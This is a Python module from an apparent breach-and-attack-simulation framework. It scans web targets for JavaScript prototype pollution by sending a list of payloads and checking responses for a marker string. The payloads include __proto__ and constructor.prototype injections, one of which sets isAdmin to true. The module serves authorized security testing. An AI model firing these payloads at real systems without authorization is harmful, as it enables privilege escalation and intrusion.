"""Prototype Pollution testing. MITRE ATT&CK: T1190"""
from __future__ import annotations
import uuid, json
from typing import Any
from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus

DEFAULT_PP_PAYLOADS = [
    '{"__proto__":{"polluted":"BAS_PP_TEST"}}', '{"constructor":{"prototype":{"polluted":"BAS_PP_TEST"}}}',
    '{"__proto__":{"isAdmin":true}}', '{"__proto__":{"status":200}}',
    '__proto__[polluted]=BAS_PP_TEST', 'constructor.prototype.polluted=BAS_PP_TEST',
    '__proto__.polluted=BAS_PP_TEST', '{"__proto__":{"toString":"BAS_PP_TEST"}}',
]

class PrototypePollutionModule(BaseAttackModule):
    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(name="prototype_pollution", description="JavaScript prototype pollution", category="prototype_pollution",
            mitre_technique_ids=["T1190"], mitre_technique_names=["Exploit Public-Facing Application"],
            auth_level_required=AuthorizationLevel.LOW_IMPACT, owasp_category="A03:2021 - Injection",
            cwe_ids=["CWE-1321"], tags=["prototype_pollution", "javascript"])

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        return DEFAULT_PP_PAYLOADS

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        requests = []
        for p in payloads:
            ct = "application/json" if p.startswith("{") else "application/x-www-form-urlencoded"
            requests.append(AttackRequest(request_id=f"pp-{uuid.uuid4().hex[:8]}", target=target,
                method="POST", path=options.get("path", "/"), body=p, content_type=ct,
                headers={"X-BAS-Payload": p[:50]}))
            if not p.startswith("{"):
                requests.append(AttackRequest(request_id=f"pp-{uuid.uuid4().hex[:8]}", target=target,
                    method="GET", path=options.get("path", "/"), params={"__proto__[polluted]": "BAS_PP_TEST"}))
        return requests

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        body = response.body_text
        if "BAS_PP_TEST" in body or '"polluted"' in body:
            return ModuleResult(module_name="prototype_pollution", target=request.target, status=VulnStatus.VULNERABLE,
                payload_used=payload, response_code=response.status_code, response_body_preview=body[:500],
                elapsed_ms=response.elapsed_ms, evidence="Prototype pollution: polluted property reflected",
                severity="high", mitre_technique_id="T1190")
        return ModuleResult(module_name="prototype_pollution", target=request.target,
            status=VulnStatus.NOT_VULNERABLE, payload_used=payload, response_code=response.status_code, elapsed_ms=response.elapsed_ms)
